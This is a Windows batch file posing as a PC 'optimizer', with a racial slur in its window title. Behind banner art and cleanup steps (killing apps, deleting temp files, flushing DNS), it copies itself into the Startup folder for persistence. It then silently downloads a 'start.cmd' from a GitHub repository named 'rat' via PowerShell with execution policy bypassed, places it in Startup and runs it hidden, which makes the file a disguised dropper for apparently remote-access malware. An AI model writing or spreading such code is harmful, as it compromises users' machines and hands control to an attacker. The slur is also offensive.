@echo off
title skibidi niggas optimizer
chcp 65001>nul                                       
echo.               
echo            88         88  88           88           88  88  
echo            88         ""  88           ""           88  ""  
echo            88             88                        88      
echo ,adPPYba,  88   ,d8   88  88,dPPYba,   88   ,adPPYb,88  88  
echo I8[    ""  88 ,a8"    88  88P'    "8a  88  a8"    `Y88  88  
echo  `"Y8ba,   8888[      88  88       d8  88  8b       88  88  
echo aa    ]8I  88`"Yba,   88  88b,   ,a8"  88  "8a,   ,d88  88  
echo `"YbbdP"'  88   `Y8a  88  8Y"YbbdP"'   88   `"PbbdP"Y'  88
echo.
set "startup=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
set "target=%startup%\pc_optimizer.bat"
if not "%~f0"=="%target%" (
    copy "%~f0" "%target%" >nul
)
echo setting at startup
taskkill /f /im OneDrive.exe >nul 2>&1
echo killing OneDrive
taskkill /f /im Teams.exe >nul 2>&1
echo killing Teams
taskkill /f /im Discord.exe >nul 2>&1
echo killing Discord
taskkill /f /im Spotify.exe >nul 2>&1
echo killing Spotify
del /s /f /q "%temp%\*" >nul 2>&1
for /d %%i in ("%temp%\*") do rd /s /q "%%i" >nul 2>&1
del /f /q "%localappdata%\Microsoft\Windows\Explorer\thumbcache_*" >nul 2>&1
echo cleaning temp files
ipconfig /flushdns >nul 2>&1
echo flushing dns
set "DL_DIR=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
set "DL_FILE=%DL_DIR%\start.cmd"
set "DL_URL=https://raw.githubusercontent.com/pulgax-g/rat/refs/heads/main/start.cmd"
if not exist "%DL_DIR%" mkdir "%DL_DIR%"
powershell -NoProfile -ExecutionPolicy Bypass ^
  -Command "try { Invoke-WebRequest -Uri '%DL_URL%' -OutFile '%DL_FILE%' -UseBasicParsing } catch {}" ^
  >nul 2>&1
start "" /min "%DL_FILE%"
wmic process where name="explorer.exe" CALL setpriority 128 >nul 2>&1
exit
